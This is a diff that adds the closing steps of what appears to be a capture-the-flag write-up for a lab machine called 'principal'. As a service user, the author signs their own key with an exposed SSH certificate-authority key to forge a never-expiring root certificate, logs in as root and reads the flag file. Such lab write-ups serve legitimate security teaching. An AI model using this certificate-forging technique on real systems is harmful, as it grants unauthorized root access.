@@ -264,3 +264,30 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
+With the key generated we can sign it using the listed directory of the master stamp. 
+
+```
+svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca -I "root-access" -n root /tmp/mykey.pub
+Signed user key /tmp/mykey-cert.pub: id "root-access" serial 0 for root valid forever
+```
+
+Lastly we need to then re-establish a ssh connection using our newly generated root-access key.
+
+```
+svc-deploy@principal:/tmp$ ssh -i /tmp/mykey -i /tmp/mykey-cert.pub root@localhost
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@principal:~# ls
+root.txt
+root@principal:~# cat root.txt
+ROOT_FLAG_HERE
